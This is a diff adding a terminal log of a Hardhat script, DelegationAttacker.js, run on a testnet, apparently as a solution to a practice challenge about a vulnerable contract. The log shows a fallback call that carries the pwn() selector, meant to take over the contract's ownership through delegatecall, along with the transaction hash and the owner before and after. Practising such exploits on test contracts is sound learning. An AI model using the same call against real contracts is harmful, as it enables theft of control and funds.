@@ -1,0 +1,11 @@
+C:\VScodeProject\Web3\22_Delegation>npx hardhat run scripts/DelegationAttacker.js --network optimismSepolia
+我的帳戶地址 by hre:  0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6
+目前所有者: 0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6
+pwn()
+pwn() selector: 0xdd365b8b
+發送交易呼叫 fallback, 使用 pwn() 的 calldata...
+交易發送中，交易哈希: 0x6c9206911cd3aa7b7170960fb520d188483d845ffe7cbdbc576f8333c26a0049
+交易確認，區塊號: 25382029
+新的所有者: 0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6
+
+C:\VScodeProject\Web3\22_Delegation>
